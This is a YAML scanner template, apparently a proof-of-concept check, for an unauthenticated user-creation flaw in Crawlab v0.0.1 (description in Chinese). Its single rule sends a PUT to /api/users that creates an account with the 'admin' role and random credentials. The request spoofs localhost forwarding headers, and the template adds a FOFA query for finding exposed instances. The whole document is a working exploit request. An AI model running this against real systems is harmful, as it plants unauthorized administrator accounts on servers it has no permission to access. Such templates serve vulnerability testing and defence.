id: Crawlab-users-Addbyanyuser

info:
  name: Crawlab users 任意用户添加漏洞
  author: daffainfo
  severity: critical
  description: Crawlab users 的 api 存在任意用户添加，且添加为未授权接口，可通过添加后在后台进一步攻击。漏洞影响:Crawlab v0.0.1
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Crawlab%20users%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa-query: title="Crawlab"

set:
    r1: randomLowercase(20)
rules:
  r0:
    request:
      method: PUT
      path: /api/users
      headers:
        Accept: application/json, text/plain, */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935
        x-forwarded-for: 127.0.0.1
        x-originating-ip: 127.0.0.1
        x-remote-ip: 127.0.0.1
        x-remote-addr: 127.0.0.1
      body: |
        {"username":"{{r1}}","password":"{{r1}}","role":"admin","email":"{{r1}}@qq.com"}
    expression: response.status == 200 && response.body.bcontains(bytes(r1))
expression: r0()